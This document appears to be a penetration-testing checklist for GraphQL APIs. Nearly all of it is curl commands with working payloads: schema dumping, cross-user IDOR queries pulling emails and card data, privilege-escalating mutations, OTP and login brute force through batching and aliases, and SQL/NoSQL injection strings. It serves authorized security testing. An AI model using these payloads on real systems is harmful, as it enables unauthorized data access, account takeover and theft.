# GraphQL API Security Testing

## Objective

Test GraphQL-specific attack surfaces including schema exposure, unauthorized data access through queries and mutations, batching attacks, injection vulnerabilities, and resource exhaustion.

---

## 1. GraphQL Endpoint Identification

```bash
# Fingerprint GraphQL endpoint
GRAPHQL_PATHS=("/graphql" "/graphiql" "/api/graphql" "/v1/graphql" "/gql" "/query" "/graphql/console")

for EP in "${GRAPHQL_PATHS[@]}"; do
  RESP=$(curl -si -X POST "https://target$EP" \
    -H "Content-Type: application/json" \
    -d '{"query":"{__typename}"}' \
    -w "%{http_code}" -o /tmp/graphql_resp.txt 2>/dev/null)
  [[ "$RESP" == "200" ]] && grep -q "__typename" /tmp/graphql_resp.txt && \
    echo "GraphQL found at: $EP"
  sleep 0.1
done
```

---

## 2. Schema Discovery

### 2.1 Introspection Query
```bash
# Full schema introspection
curl -s -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ __schema { queryType { name } mutationType { name } subscriptionType { name } types { kind name description fields { name description type { name kind ofType { name kind } } args { name description type { name kind } } } inputFields { name description type { name kind } } enumValues { name description } possibleTypes { name } } directives { name description locations args { name description type { name kind } } } } }"
  }' | python3 -m json.tool > /tmp/schema_dump.json

echo "Schema saved to /tmp/schema_dump.json"
wc -l /tmp/schema_dump.json
```

### 2.2 When Introspection is Disabled
```bash
# Field suggestion attack — probe field names
curl -s -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ admin { id } }"}' | grep "Did you mean"

# Clairvoyance tool (if available)
# python3 clairvoyance.py -u https://target/graphql -w wordlist.txt
```

---

## 3. Authentication Testing

```bash
# Test queries without authentication token
curl -si -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { id email role } }"}' | grep -E "HTTP|email|error"

# Test with user token on admin queries
curl -si -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer USER_TOKEN" \
  -d '{"query":"{ adminPanel { users { id email role password } systemConfig { dbUrl smtpPass } } }"}' | grep HTTP
```

---

## 4. IDOR via GraphQL ID Arguments

```bash
# Access another user's private data by substituting IDs
curl -s -X POST https://target/graphql \
  -H "Authorization: Bearer USER_A_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ user(id: \"USER_B_ID\") { id email phone address creditCards { number cvv } } }"
  }' | python3 -m json.tool
```

---

## 5. Mutation Testing

### Unauthorized Mutations
```bash
# Attempt privilege-escalating mutation
curl -s -X POST https://target/graphql \
  -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation { updateUserRole(userId: \"USER_ID\", role: \"admin\") { id role } }"
  }' | python3 -m json.tool

# Delete another user's content
curl -s -X POST https://target/graphql \
  -H "Authorization: Bearer USER_A_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation { deletePost(id: \"USER_B_POST_ID\") { success message } }"
  }' | python3 -m json.tool
```

---

## 6. Query Batching Attack (Rate Limit Bypass)

```bash
# Batch multiple operations in single request
# This bypasses per-request rate limiting
curl -s -X POST https://target/graphql \
  -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"mutation { verifyOTP(otp: \"1000\") { success token } }"},
    {"query":"mutation { verifyOTP(otp: \"1001\") { success token } }"},
    {"query":"mutation { verifyOTP(otp: \"1002\") { success token } }"},
    {"query":"mutation { verifyOTP(otp: \"1003\") { success token } }"},
    {"query":"mutation { verifyOTP(otp: \"1004\") { success token } }"}
  ]' | python3 -m json.tool
```

---

## 7. Alias-Based Query Flooding

Aliases allow multiple queries of the same type in one request:

```bash
# Login brute force via aliases
curl -s -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ a1:login(email:\"admin@t.com\",pass:\"password1\"){token} a2:login(email:\"admin@t.com\",pass:\"password2\"){token} a3:login(email:\"admin@t.com\",pass:\"password3\"){token} a4:login(email:\"admin@t.com\",pass:\"password4\"){token} a5:login(email:\"admin@t.com\",pass:\"password5\"){token} }"
  }' | grep -E "token|null"
```

---

## 8. Injection via Arguments

### SQL Injection
```bash
curl -s -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users(search: \"'\''OR 1=1 --\") { id email } }"}' | grep -iE "email|error|sql"
```

### NoSQL Injection
```bash
curl -s -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(id: {\"$gt\": \"\"}) { id email } }"}' | grep HTTP
```

---

## 9. Subscription Testing

```bash
# If WebSocket subscriptions are available
# Check if subscription endpoint is authenticated
# wss://target/graphql/subscriptions
# Test unauthenticated subscription to sensitive events
```

---

## 10. Field-Level Authorization

Test if individual fields on shared objects have their own authorization:

```bash
# User query returns basic data
curl -s -X POST https://target/graphql \
  -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(id:\"MY_ID\") { id name email internalNotes adminComments paymentHistory { amount card } } }"}' \
  | python3 -m json.tool

# Check if restricted fields (internalNotes, adminComments, paymentHistory) are returned
```

---

## GraphQL Tool Reference

```bash
# graphql-cop — automated security checks
# pip install graphql-cop
graphql-cop -t https://target/graphql -o json > graphql_cop_output.json

# InQL — introspection and analysis
# pip install inql
inql -t https://target/graphql -o graphql_report/

# clairvoyance — schema inference when introspection is disabled
# python3 clairvoyance.py -u https://target/graphql
```

---

## Findings Reference

| Test | Result | Severity |
|---|---|---|
| Introspection enabled in production | Pass/Fail | Medium |
| Unauthenticated query access | Pass/Fail | High |
| IDOR via object ID argument | Pass/Fail | High |
| Unauthorized mutation execution | Pass/Fail | High |
| Batching bypasses rate limiting | Pass/Fail | High |
| SQL/NoSQL injection in argument | Pass/Fail | Critical |
| Sensitive field exposure | Pass/Fail | High |
| GraphQL playground in production | Pass/Fail | Low |
